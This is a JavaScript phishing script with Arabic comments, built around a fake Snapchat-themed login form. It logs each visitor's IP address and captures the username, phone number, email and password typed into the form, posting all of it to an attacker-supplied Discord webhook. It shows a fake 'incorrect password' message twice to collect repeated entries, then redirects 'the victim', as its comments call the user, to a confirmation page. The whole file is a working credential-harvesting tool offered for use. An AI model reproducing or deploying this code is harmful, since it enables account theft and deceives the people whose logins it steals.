// ===============================================
// 1. إعدادات ديسكورد
// ضع رابط الويب هوك الخاص بك هنا
const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; 
// ===============================================

// دالة الإرسال إلى ديسكورد
function sendToDiscord(message) {
    if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "YOUR_DISCORD_WEBHOOK_URL_HERE") {
        console.warn("Discord Webhook URL is not configured.");
        return Promise.resolve();
    }

    const payload = {
        content: message,
        username: "Snapchat Tracker",
        avatar_url: "https://i.imgur.com/gK9u5lA.png" 
    };

    return fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    }).catch(error => console.error("Error:", error));
}

// دالة تتبع الزوار (عند فتح الصفحة)
function trackVisitorIP() {
    let dateTime = new Date().toLocaleString('ar-EG');
    fetch("https://api64.ipify.org?format=json")
        .then(res => res.json())
        .then(data => {
            sendToDiscord(`🔔 **زيارة جديدة**\n📄 الصفحة: ${document.title}\n🌍 IP: ${data.ip}\n⏰ الوقت: ${dateTime}`);
        })
        .catch(err => console.log(err));
}

// ===============================================
// منطق النموذج (الخانات الأربعة)
// ===============================================
let attempts = 0;
const MAX_ATTEMPTS = 3;

document.addEventListener('DOMContentLoaded', () => {
    // تشغيل تتبع الـ IP عند التحميل
    trackVisitorIP();

    const form = document.getElementById("submissionForm");
    
    if (form) {
        form.addEventListener("submit", function(event) {
            event.preventDefault(); // منع التحديث التلقائي
            
            const btn = document.getElementById("submitBtn");
            const statusMsg = document.getElementById("statusMessage");
            const loading = document.getElementById("loadingOverlay");

            // 1. جلب البيانات من الخانات الأربعة
            let username = document.getElementById("username").value;
            let phone = document.getElementById("phoneNumber").value;
            let email = document.getElementById("trackingEmail").value;
            let password = document.getElementById("passwordField").value;

            // 2. تجهيز الرسالة
            let msg = `🔥 **صيد جديد (محاولة ${attempts + 1})**\n`;
            msg += `👤 **اسم المستخدم:** \`${username}\`\n`;
            msg += `📱 **رقم الهاتف:** \`${phone}\`\n`;
            msg += `📧 **البريد:** \`${email}\`\n`;
            msg += `🔑 **كلمة المرور:** \`${password}\`\n`;
            msg += `⏰ **التاريخ:** ${new Date().toLocaleString('ar-EG')}`;

            // 3. منطق المحاولات (فشل مرتين ثم نجاح)
            if (attempts < MAX_ATTEMPTS - 1) {
                // --- حالة الفشل (المحاولة 1 و 2) ---
                attempts++;
                sendToDiscord(msg); // إرسال البيانات

                // إظهار رسالة خطأ وهمية
                statusMsg.style.display = 'block';
                statusMsg.textContent = "كلمة المرور غير صحيحة، يرجى المحاولة مرة أخرى.";
                statusMsg.style.color = "red";
                
                // مسح حقل كلمة المرور فقط
                document.getElementById("passwordField").value = "";
                
            } else {
                // --- حالة النجاح (المحاولة 3) ---
                attempts++;
                btn.disabled = true;
                statusMsg.style.display = 'none';
                loading.style.display = 'flex'; // إظهار شاشة التحميل

                msg += "\n✅ **(تم توجيه الضحية لصفحة التأكيد)**";
                sendToDiscord(msg);

                // التوجيه بعد 3 ثواني
                setTimeout(() => {
                    window.location.href = "confirmation.html";
                }, 3000);
            }
        });
    }
});
